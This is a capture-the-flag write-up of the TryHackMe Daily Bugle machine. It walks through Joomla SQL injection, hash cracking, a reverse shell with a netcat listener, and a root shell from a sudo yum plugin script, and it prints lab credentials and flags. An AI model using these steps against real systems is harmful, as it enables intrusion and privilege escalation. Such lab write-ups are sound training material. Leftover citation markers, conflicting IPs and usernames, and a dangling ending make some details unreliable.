# Penetration Test Write-up: Buggle - THM

[cite_start]This document details the successful exploitation, privilege escalation, and flag retrieval for the target machine, `dailybugle` (10.81.163.107)[cite: 1].

---

## 🔍 Phase 1: Enumeration and Initial Access

### 1.1 Service Discovery (Nmap)

[cite_start]An initial Nmap scan revealed the following critical information[cite: 1]:

* [cite_start]**Target IP:** 10.81.163.107[cite: 1].
* [cite_start]**Port 22/tcp (SSH):** Open, running **OpenSSH 7.4**[cite: 1].
* [cite_start]**Port 80/tcp (HTTP):** Open, running **Apache httpd 2.4.6** ((CentOS) PHP/5.6.40)[cite: 1]. The server runs **Joomla! - [cite_start]Open Source Content Management**[cite: 1].
* [cite_start]**Port 3306/tcp (MySQL):** Open, running **MariaDB 10.3.23** or earlier[cite: 1].
* [cite_start]**OS Details:** Linux 4.15 (later confirmed as **CentOS Linux 7 (Core)**)[cite: 1].

### 1.2 Vulnerability Identification

[cite_start]The Joomla! version was identified by accessing `/administrator/manifests/files/joomla.xml`[cite: 1]:

* **Joomla! [cite_start]Version:** **3.7.0**[cite: 1].
* **Vulnerability:** Joomla! [cite_start]3.7.0 is susceptible to a **SQL Injection** attack, tracked as **CVE-2017-8917**[cite: 1].

### 1.3 Exploitation and Credential Extraction

[cite_start]The exploit script for CVE-2017-8917 was executed, confirming the vulnerability and enumerating the database[cite: 1]:

1.  [cite_start]**Database Info:** Current database is `joomla` running **5.5.64-MariaDB**[cite: 1].
2.  [cite_start]**Table Dump:** The script enumerated the tables, including the relevant `#__users` table[cite: 1].
3.  [cite_start]**User Data Extraction:** Data from the `#__users` table was dumped, revealing the credentials for a 'Super User'[cite: 1]:
    * [cite_start]**Username:** `jonah` [cite: 1]
    * [cite_start]**Email:** `jonah@tryhackme.com` [cite: 1]
    * [cite_start]**Password Hash:** `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm` [cite: 1]

### 1.4 Hash Cracking (Offline Attack)

[cite_start]The extracted bcrypt hash was cracked using **John the Ripper** with the `rockyou.txt` wordlist[cite: 1]:

* [cite_start]**Hash:** `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm` [cite: 1]
* [cite_start]**Cracked Password:** **`spiderman123`** [cite: 1]

---
### 1.5 reverse shell
With the username and password I aquired via the SQL injection i could login to the administrator page of joomla! at
http://10.82.159.101/administrato then upload a reverse shell in the template section at index.php and setup a listner.
    rlwrap nc -lvnp [PORT]
Then I could click view template to execute the code and get the reverse shell and our initial acess.

## 💻 Phase 2: Post-Exploitation

### 2.1 Web Shell and Shell Upgrade

[cite_start]A PHP reverse shell was uploaded and executed (via `index.php` or template preview), establishing a reverse connection to the attacker's netcat listener[cite: 1]. The shell was stabilized using the following commands:

* [cite_start]`perl -e 'exec "/bin/bash";'` [cite: 1]
* [cite_start]`export TERM=xterm` [cite: 1]
* [cite_start]`/usr/bin/script -qc /bin/bash /dev/null` [cite: 1]

### 2.2 Finding Additional Credentials

[cite_start]The Joomla! configuration file was located and read to find database credentials[cite: 1]:

* [cite_start]**File Path:** `/var/www/html/configuration.php` [cite: 1]
* **Extracted Credentials:**
    * [cite_start]**Database User (Found in File):** `root` [cite: 1]
    * [cite_start]**Database Password (Found in File):** `nv5uz9r3ZEDzVjNu` [cite: 1]
    * [cite_start]**Extracted Credential Summary:** Database User: `jjameson` [cite: 1][cite_start], Database Password (The Key): `nv5uz9r3ZEDzVjNu`[cite: 1].

### 2.3 User Access and User Flag

[cite_start]The newly found password (`nv5uz9r3ZEDzVjNu`) was attempted for the `root` user via `su` but failed[cite: 1]. [cite_start]However, using the username `jjameson` and the password `nv5uz9r3ZEDzVjNu` successfully enabled **SSH login**[cite: 1].

The user flag was retrieved from the home directory:

* [cite_start]**User Flag:** `27a260fe3cba712cfdedb1c86d80442e` [cite: 1]

---

## 👑 Phase 3: Privilege Escalation (Root)

### 3.1 Sudo Privileges Enumeration

[cite_start]Checking the user's `sudo` privileges revealed a critical configuration[cite: 1]:

* [cite_start]**User `jjameson`** may run: **`(ALL) NOPASSWD: /usr/bin/yum`**[cite: 1].

### 3.2 System Details for Context

[cite_start]The operating system was confirmed to be **CentOS Linux 7 (Core)** with kernel **3.10.0-1062.el7.x86_64**[cite: 1]. (Potential local exploits like PwnKit and Dirty Cow were noted but the primary vector was the `sudo` configuration) [cite_start][cite: 1].

### 3.3 Root Escalation via Malicious YUM Plugin

    https://gtfobins.github.io/gtfobins/yum/#sudo

Using GTFOBINS the god of privilege escalation in unix we find that "yum"
is in the files they can run with sudo.

Using the commands below we can gain root
    
    TF=$(mktemp -d)
    cat >$TF/x<<EOF
    [main]
    plugins=1
    pluginpath=$TF
    pluginconfpath=$TF
    EOF
    
    cat >$TF/y.conf<<EOF
    [main]
    enabled=1
    EOF
    
    cat >$TF/y.py<<EOF
    import os
    import yum
    from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
    requires_api_version='2.1'
    def init_hook(conduit):
      os.execl('/bin/sh','/bin/sh')
    EOF
    
    sudo yum -c $TF/x --enableplugin=y

### retrieving the root flag
## retrieve root flag
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
sh-4.2# pwd
/root
sh-4.2# 



3.  [cite_start]**Execution:** The `sudo yum` command was executed, loading the malicious plugin and granting a root shell (`sh-4.2#`)[cite: 1].

The exploit commands were:
